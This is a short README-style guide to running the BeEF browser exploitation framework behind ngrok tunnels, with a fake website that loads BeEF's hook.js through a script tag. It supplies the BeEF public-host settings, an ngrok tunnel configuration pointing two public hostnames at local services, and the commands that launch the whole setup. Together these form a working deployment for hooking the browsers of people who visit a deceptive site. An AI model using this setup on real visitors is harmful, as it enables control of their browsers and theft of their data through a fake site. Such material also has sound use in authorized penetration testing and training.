# Configuration for beef to work with ngrok

Following settings should make it possible to use beef AND a fake web site, all with ngrok and a working hook.js. The fake web site inclides the script from the beef proxy.  

Fake site can be viewed at ```http://my-website.ngrok.io```.  
Beef hook.js can be included in the fake web site with ```<script src="https://my-website-beef.ngrok.io/hook.js"></script>```.  


## Beef configuration

The following configuration should be present.  
Do not add any port.  
```
beef:
	http:
		public:
			host: "my-website-beef.ngrok.io"
			port: ""
			https: true
```
Complete beef config can be viewed in ```config-beef.yml```  

## ngrok configuration

Place the config file in the root folder of ngrok. 
In my case I have configured to own domains in ngrok settings
- my-website.ngrok.io      <- Pointing to my fake web site
- my-website-beef.ngrok.io <- Pointing to beef (https)
```
authtoken: <token-for-ngrok>
region: us
tunnels:
  web:
    addr: http://127.0.0.1:1234
    proto: http
    hostname: my-website.ngrok.io
  beef:
    addr: https://127.0.0.1:3000
    proto: http
    hostname: my-website-beef.ngrok.io
    bind_tls: true
```
Complete ngrok config can be viewed in ```config-ngrok.yml```  

## Load it up

```
root💀~/tools/ngrok
$ ./ngrok start --all --config=config-ngrok.yml
```

```
root💀~/tools/public
$ python3 -m http.server 1234
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
```

```
root💀~/tools/beef
$ .\beef
```